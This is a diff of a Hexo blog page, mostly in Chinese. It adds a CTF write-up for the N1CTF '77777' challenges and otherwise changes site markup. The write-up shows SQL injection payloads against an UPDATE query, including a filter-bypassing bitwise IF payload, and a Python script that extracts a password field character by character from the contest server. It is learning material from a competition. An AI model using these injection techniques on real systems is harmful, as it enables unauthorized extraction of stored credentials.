@@ -224,6 +224,66 @@
         
         <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
             <div class="level-left">
+                <time class="level-item has-text-grey" datetime="2018-03-11T16:40:00.000Z">2018-03-12</time>
+                
+                <div class="level-item">
+                <a class="has-link-grey -link" href="/categories/jekyll-update/">jekyll update</a>
+                </div>
+                
+                
+                <span class="level-item has-text-grey">
+                    
+                    
+                    5 分钟 读完 (大约 772 个字)
+                </span>
+                
+            </div>
+        </div>
+        
+        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
+            
+                <a class="has-link-black-ter" href="/2018/03/n1ctf-writeup/">N1CTF 77777 writeup</a>
+            
+        </h1>
+        <div class="content">
+            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>&emsp;&emsp;这是我及我所在的团队第一次参加<code>正式</code>的CTF比赛，所取得的成绩也还算满意，比赛过程中作者负责<code>web</code>方向，比赛中的成果就是两道<code>77777</code>。</p>
+<h3 id="77777"><a href="#77777" class="headerlink" title="77777"></a>77777</h3><p>&emsp;&emsp;题目描述：</p>
+<p><div align="center"><br>    <img src="/images/posts/n1ctf/1.png"><br></div></p>
+<p><div align="center"><br>    <img src="/images/posts/n1ctf/2.png"><br></div><br>&emsp;&emsp;这道题最坑的就是一开始<code>没有判断出是否注入成功的依据</code>，后面经师兄指导才发现依据就是注入的数字是否已经改变，当然这道题的环境官方也说明每个队注入<code>没有隔离开</code>，造成即使注入成功也可能被别的队刷走，从而影响判断。</p>
+<p>&emsp;&emsp;又因为它是<code>sptintf(&quot;xxx%d%s&quot;)</code>，所以注入应该在<code>str</code>的地方，也就是在<code>hi</code>中进行注入，payload：<code>hi=000 where ord(substr(password, 1, 1))&gt;100</code>，因为是在<code>update users set</code>中注入，所以这里不需要再使用<code>union,select</code>等方法了。完整的payload如下图：</p>
+<p><div align="center"><br>    <img src="/images/posts/n1ctf/3.png"><br></div><br>&emsp;&emsp;如果注入成功，则会返回你的<code>flag</code>字段，如：</p>
+<p><div align="center"><br>    <img src="/images/posts/n1ctf/4.png"><br></div><br>&emsp;&emsp;由于这个题的环境不稳定，不太适合脚本的判断，所以，就手工注入一遍了。</p>
+<h3 id="77777-2"><a href="#77777-2" class="headerlink" title="77777 2"></a>77777 2</h3><p>&emsp;&emsp;这道题跟上一道提供的描述是一样的，不同的是对<code>hi</code>进行了更严格的过滤，上一道的payload就无效了。</p>
+<p>&emsp;&emsp;这道题过滤了<code>and or || &amp; &amp;&amp;</code>（为了不产生二义，这里用空格分隔），但是唯独没有过滤掉<code>|</code>。所以我们可以选择<code>|</code>进行<code>位注入</code>。然后在检测一下，没有被过滤的是：<code>substr select from if</code>，所以考虑用<code>if</code>替代<code>where</code>进行判断。</p>
+<p>&emsp;&emsp;经过一轮苦逼的测试，终于搞出一个payload：<code>hi=000 |  IF (substr((select substr( pw from 1)),1,1)&gt;&#39;z&#39;,1,0)</code>，这里<code>( pw</code>中间一定要有<code>空格</code>，不然无法绕过。另一个要说的就是<code>pw from 1</code>，它会返回<code>pw字段从1开始的所有值</code>。如：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pw = &apos;flag&#123;123456&#125;&apos;</span><br><span class="line">pw from 1 ---&gt; flag&#123;123456&#125;</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;payload：</p>
+<p><div align="center"><br>    <img src="/images/posts/n1ctf/5.png"><br></div><br>&emsp;&emsp;判断的依据是返回的数字的最后一位，如：</p>
+<p><div align="center"><br>    <img src="/images/posts/n1ctf/6.png"><br></div><br>&emsp;&emsp;如果是返回错误则是如下：</p>
+<p><div align="center"><br>    <img src="/images/posts/n1ctf/7.png"><br></div></p>
+<p><div align="center"><br>    <img src="/images/posts/n1ctf/8.png"><br></div></p>
+<blockquote>
+<p>另一个tips就是数字的后一位一定要<code>0</code>，不然如果是<code>1</code>的话就无法判断了。<code>1 |</code>任何也是真。</p>
+</blockquote>
+<p>&emsp;&emsp;再然后就是逐位的判断，有些数字会被过滤掉，这点上不知道是我的payload有问题还是本来就是这样。。。。</p>
+<p><div align="center"><br>    <img src="/images/posts/n1ctf/9.png"><br></div><br>&emsp;&emsp;如上，逐位比较的时候使用<code>+1</code>的方法，如果直接用2,3,4,…的话有些数字<code>会被过滤</code>，还有就是有些字符也会被过滤，但无关flag字段。<br>&emsp;&emsp;附上脚本：<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="hljs-keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="hljs-string">'http://47.52.137.90:20000/'</span></span><br><span class="line">flag = <span class="hljs-string">''</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>, <span class="hljs-number">50</span>):</span><br><span class="line">    lc = <span class="hljs-string">''</span></span><br><span class="line">    <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> range(i):</span><br><span class="line">        lc += <span class="hljs-string">'+1'</span></span><br><span class="line">    lc = lc[<span class="hljs-number">1</span>:]</span><br><span class="line">    sql = <span class="hljs-string">'000 |  IF (substr((select substr( pw from 1)),&#123;0&#125;,1)&gt;\'&#123;1&#125;\',1,0)'</span></span><br><span class="line">    <span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> range(<span class="hljs-number">33</span>, <span class="hljs-number">128</span>):</span><br><span class="line">        sqli = sql.format(lc, chr(ch))</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="hljs-string">'flag'</span>: <span class="hljs-number">123</span>,</span><br><span class="line">            <span class="hljs-string">'hi'</span>: sqli</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="hljs-comment"># print(data)</span></span><br><span class="line">        html = requests.post(url, data=data)</span><br><span class="line">        text = html.text</span><br><span class="line">        <span class="hljs-comment"># print(text)</span></span><br><span class="line">        <span class="hljs-keyword">if</span> <span class="hljs-string">'123000'</span> <span class="hljs-keyword">in</span> text:</span><br><span class="line">            flag += chr(ch)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="hljs-keyword">break</span></span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            <span class="hljs-keyword">pass</span></span><br></pre></td></tr></table></figure></p>
+
+        </div>
+        
+        
+        
+    </div>
+</div>
+
+
+
+
+
+    <div class="card">
+    
+    <div class="card-content article ">
+        
+        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
+            <div class="level-left">
                 <time class="level-item has-text-grey" datetime="2018-03-07T16:40:00.000Z">2018-03-08</time>
                 
                 <div class="level-item">
@@ -710,52 +770,6 @@
 
 
 
-    <div class="card">
-    
-    <div class="card-content article ">
-        
-        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
-            <div class="level-left">
-                <time class="level-item has-text-grey" datetime="2017-12-24T15:00:00.000Z">2017-12-24</time>
-                
-                <div class="level-item">
-                <a class="has-link-grey -link" href="/categories/jekyll-update/">jekyll update</a>
-                </div>
-                
-                
-                <span class="level-item has-text-grey">
-                    
-                    
-                    6 分钟 读完 (大约 835 个字)
-                </span>
-                
-            </div>
-        </div>
-        
-        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
-            
-                <a class="has-link-black-ter" href="/2017/12/security-search/">“黑塔”-一款专注于网络安全的垂直搜索引擎</a>
-            
-        </h1>
-        <div class="content">
-            <h2 id="关于"><a href="#关于" class="headerlink" title="关于"></a>关于</h2><p>&emsp;&emsp;这个项目，<a href="https://www.secsearch.top" target="_blank" rel="noopener">项目地址</a>，暂且称为<code>“黑塔”</code>，愿景是能够成为网络安全中的一座灯塔，为<code>寻路</code>的人提供方向。它是一款专注于<code>网络安全</code>的<code>垂直搜索引擎</code>。  </p>
-<p>&emsp;&emsp;一开始想到这个项目的初衷是锻炼自己的开发能力，以及方便自己需要的时候查找资料。但在后来，作者发现网上<code>还没有</code>一款专注于网络安全的垂直搜索引擎，遂萌发自己打造一款引擎。也许有人会觉得百度、Google等主流搜索引擎那么强大，哪还需要自己专门开发一款垂直搜索引擎，但事实上并非如此，这里不是说它们不够强大，而是从<code>另一个角度</code>思考问题，Google等搜索引擎包罗万象，体积庞大，很多时候无法收录全面，并且更新存在比较大的延迟，这对信息新鲜度要求极高的网安领域来说是一个缺陷，加之很多大佬的优质博客根本没有做所谓的SEO优化，导致即使被搜索引擎收录，其排名也比较低下，用户需要特别注意才能发觉。  </p>
-<p>&emsp;&emsp;而作为垂直搜索引擎，它拥有<code>短小精悍</code>、<code>更新速度快</code>、<code>信息来源准确</code>的特点，它能够给用户提供<code>新鲜</code>、<code>准确</code>、<code>原创</code>的信息，这就是垂直搜索引擎存在的意义。  </p>
-<p>&emsp;&emsp;“黑塔”的收录信息主要来源于网络安全领域各大佬的<code>博客</code>、<code>安全论坛</code>等专业、可信的信息源，所以，在这里，你能得到更加<code>准确</code>、<code>新鲜</code>的信息，要知道，在网安领域，一个<code>漏洞</code>或<code>EXP</code>晚一小时到你手里所产生的影响都是不同的。“黑塔”的另一个特点就是对<code>新手</code>朋友帮助较大，<code>刚入门</code>或还在<code>入门阶段</code>的人可以把“黑塔”作为<code>增加知识储备</code>的手段，这里有着各网安大佬的原创文章、实战记录，潜心阅读并加以复现对提高自己的技术水平是很有帮助的。  </p>
-<p>&emsp;&emsp;目前，“黑塔”的开发工作仍在继续，<code>不管</code>它是否能受到用户欢迎，<code>也不管</code>它的用户量能有多大，作者都将<code>继续</code>完善、丰富它，以此作为作者增加开发经验、学习网安技术的手段。如果你有好的建议、想法或者本站的漏洞，也欢迎联系我，我相信你能找到我的联系方式。</p>
-<p>&emsp;&emsp;最后，希望大家能在<code>光怪陆离</code>、<code>包罗万象</code>的“黑客世界”中找到属于自己的路，也希望“黑塔”能在你成长的过程中给予你帮助，在这个充满<code>黑、白、灰</code>的世界中，<strong>坚持初心</strong>，<strong>不越雷池</strong>，才能<strong>方得始终</strong>。</p>
-
-        </div>
-        
-        
-        
-    </div>
-</div>
-
-
-
-
-
 
     
 <div class="card card-transparent">
@@ -823,7 +837,7 @@
                         文章
                     </p>
                     <p class="title has-text-weight-normal">
-                        64
+                        65
                     </p>
                 </div>
             </div>
@@ -843,7 +857,7 @@
                         标签
                     </p>
                     <p class="title has-text-weight-normal">
-                        24
+                        25
                     </p>
                 </div>
             </div>
@@ -938,7 +952,7 @@
         <h3 class="menu-label">
             标签云
         </h3>
-        <a href="/tags/BROP/" style="font-size: 10px;">BROP</a> <a href="/tags/BlockChain/" style="font-size: 10px;">BlockChain</a> <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/CVE/" style="font-size: 16.67px;">CVE</a> <a href="/tags/Hack/" style="font-size: 10px;">Hack</a> <a href="/tags/Oracle/" style="font-size: 10px;">Oracle</a> <a href="/tags/blockchain/" style="font-size: 13.33px;">blockchain</a> <a href="/tags/bypass-pie/" style="font-size: 13.33px;">bypass pie</a> <a href="/tags/kali/" style="font-size: 13.33px;">kali</a> <a href="/tags/mongodb/" style="font-size: 10px;">mongodb</a> <a href="/tags/office/" style="font-size: 16.67px;">office</a> <a href="/tags/pwm/" style="font-size: 10px;">pwm</a> <a href="/tags/pwn/" style="font-size: 13.33px;">pwn</a> <a href="/tags/ret2dl-resolve/" style="font-size: 13.33px;">ret2dl_resolve</a> <a href="/tags/rop/" style="font-size: 10px;">rop</a> <a href="/tags/web3/" style="font-size: 10px;">web3</a> <a href="/tags/windows/" style="font-size: 10px;">windows</a> <a href="/tags/writeup/" style="font-size: 10px;">writeup</a> <a href="/tags/xammpp/" style="font-size: 10px;">xammpp</a> <a href="/tags/xdebug/" style="font-size: 10px;">xdebug</a> <a href="/tags/爬虫绕过/" style="font-size: 10px;">爬虫绕过</a> <a href="/tags/百度云/" style="font-size: 10px;">百度云</a> <a href="/tags/笔记/" style="font-size: 10px;">笔记</a> <a href="/tags/鹏程杯/" style="font-size: 10px;">鹏程杯</a>
+        <a href="/tags/BROP/" style="font-size: 10px;">BROP</a> <a href="/tags/BlockChain/" style="font-size: 10px;">BlockChain</a> <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/CVE/" style="font-size: 16.67px;">CVE</a> <a href="/tags/Hack/" style="font-size: 10px;">Hack</a> <a href="/tags/Oracle/" style="font-size: 10px;">Oracle</a> <a href="/tags/blockchain/" style="font-size: 13.33px;">blockchain</a> <a href="/tags/bypass-pie/" style="font-size: 13.33px;">bypass pie</a> <a href="/tags/kali/" style="font-size: 13.33px;">kali</a> <a href="/tags/mongodb/" style="font-size: 10px;">mongodb</a> <a href="/tags/office/" style="font-size: 16.67px;">office</a> <a href="/tags/pwm/" style="font-size: 10px;">pwm</a> <a href="/tags/pwn/" style="font-size: 13.33px;">pwn</a> <a href="/tags/ret2dl-resolve/" style="font-size: 16.67px;">ret2dl_resolve</a> <a href="/tags/rop/" style="font-size: 10px;">rop</a> <a href="/tags/seccomp/" style="font-size: 10px;">seccomp</a> <a href="/tags/web3/" style="font-size: 10px;">web3</a> <a href="/tags/windows/" style="font-size: 10px;">windows</a> <a href="/tags/writeup/" style="font-size: 10px;">writeup</a> <a href="/tags/xammpp/" style="font-size: 10px;">xammpp</a> <a href="/tags/xdebug/" style="font-size: 10px;">xdebug</a> <a href="/tags/爬虫绕过/" style="font-size: 10px;">爬虫绕过</a> <a href="/tags/百度云/" style="font-size: 10px;">百度云</a> <a href="/tags/笔记/" style="font-size: 10px;">笔记</a> <a href="/tags/鹏程杯/" style="font-size: 10px;">鹏程杯</a>
     </div>
 </div>
 
@@ -952,6 +966,25 @@
         <h3 class="menu-label">
             最新文章
         </h3>
+        
+        <article class="media">
+            
+            <a href="/2019/03/dl_resolve_seccomp/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="ret2dl_resolve to bypass seccomp">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2019-03-21T16:00:00.000Z">2019-03-22</time></div>
+                    <a href="/2019/03/dl_resolve_seccomp/" class="has-link-black-ter is-size-6">ret2dl_resolve to bypass seccomp</a>
+                    <p class="is-size-7 is-uppercase">
+                        
+                    </p>
+                </div>
+            </div>
+        </article>
         
         <article class="media">
             
@@ -1029,25 +1062,6 @@
             </div>
         </article>
         
-        <article class="media">
-            
-            <a href="/2018/12/rop-study/" class="media-left">
-                <p class="image is-64x64">
-                    <img class="thumbnail" src="/images/thumbnail.svg" alt="x86 ROP study">
-                </p>
-            </a>
-            
-            <div class="media-content">
-                <div class="content">
-                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-12-03T14:05:56.000Z">2018-12-03</time></div>
-                    <a href="/2018/12/rop-study/" class="has-link-black-ter is-size-6">x86 ROP study</a>
-                    <p class="is-size-7 is-uppercase">
-                        
-                    </p>
-                </div>
-            </div>
-        </article>
-        
     </div>
 </div>
 
@@ -1066,7 +1080,7 @@
                     <span class="level-item">三月 2019</span>
                 </span>
                 <span class="level-end">
-                    <span class="level-item tag">1</span>
+                    <span class="level-item tag">2</span>
                 </span>
             </a>
         </li>
@@ -1255,7 +1269,7 @@
                             <span class="level-item">CTF</span>
                         </span>
                         <span class="level-end">
-                            <span class="level-item tag">19</span>
+                            <span class="level-item tag">20</span>
                         </span>
                     </a>
                 </li>
@@ -1376,7 +1390,7 @@
                             <span class="level-item">ret2dl_resolve</span>
                         </span>
                         <span class="level-end">
-                            <span class="level-item tag">2</span>
+                            <span class="level-item tag">3</span>
                         </span>
                     </a>
                 </li>
@@ -1385,6 +1399,17 @@
                     <a class="level is-marginless" href="/tags/rop/">
                         <span class="level-start">
                             <span class="level-item">rop</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/seccomp/">
+                        <span class="level-start">
+                            <span class="level-item">seccomp</span>
                         </span>
                         <span class="level-end">
                             <span class="level-item tag">1</span>
@@ -1515,6 +1540,25 @@
         
         <article class="media">
             
+            <a href="/2019/03/dl_resolve_seccomp/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="ret2dl_resolve to bypass seccomp">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2019-03-21T16:00:00.000Z">2019-03-22</time></div>
+                    <a href="/2019/03/dl_resolve_seccomp/" class="has-link-black-ter is-size-6">ret2dl_resolve to bypass seccomp</a>
+                    <p class="is-size-7 is-uppercase">
+                        
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
             <a href="/2019/03/ret2dl_resolve_x64/" class="media-left">
                 <p class="image is-64x64">
                     <img class="thumbnail" src="/images/thumbnail.svg" alt="ret2dl_resolve x64 study">
@@ -1589,25 +1633,6 @@
             </div>
         </article>
         
-        <article class="media">
-            
-            <a href="/2018/12/rop-study/" class="media-left">
-                <p class="image is-64x64">
-                    <img class="thumbnail" src="/images/thumbnail.svg" alt="x86 ROP study">
-                </p>
-            </a>
-            
-            <div class="media-content">
-                <div class="content">
-                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-12-03T14:05:56.000Z">2018-12-03</time></div>
-                    <a href="/2018/12/rop-study/" class="has-link-black-ter is-size-6">x86 ROP study</a>
-                    <p class="is-size-7 is-uppercase">
-                        
-                    </p>
-                </div>
-            </div>
-        </article>
-        
     </div>
 </div>
 
@@ -1626,7 +1651,7 @@
                     <span class="level-item">三月 2019</span>
                 </span>
                 <span class="level-end">
-                    <span class="level-item tag">1</span>
+                    <span class="level-item tag">2</span>
                 </span>
             </a>
         </li>
@@ -1815,7 +1840,7 @@
                             <span class="level-item">CTF</span>
                         </span>
                         <span class="level-end">
-                            <span class="level-item tag">19</span>
+                            <span class="level-item tag">20</span>
                         </span>
                     </a>
                 </li>
@@ -1936,7 +1961,7 @@
                             <span class="level-item">ret2dl_resolve</span>
                         </span>
                         <span class="level-end">
-                            <span class="level-item tag">2</span>
+                            <span class="level-item tag">3</span>
                         </span>
                     </a>
                 </li>
@@ -1945,6 +1970,17 @@
                     <a class="level is-marginless" href="/tags/rop/">
                         <span class="level-start">
                             <span class="level-item">rop</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/seccomp/">
+                        <span class="level-start">
+                            <span class="level-item">seccomp</span>
                         </span>
                         <span class="level-end">
                             <span class="level-item tag">1</span>
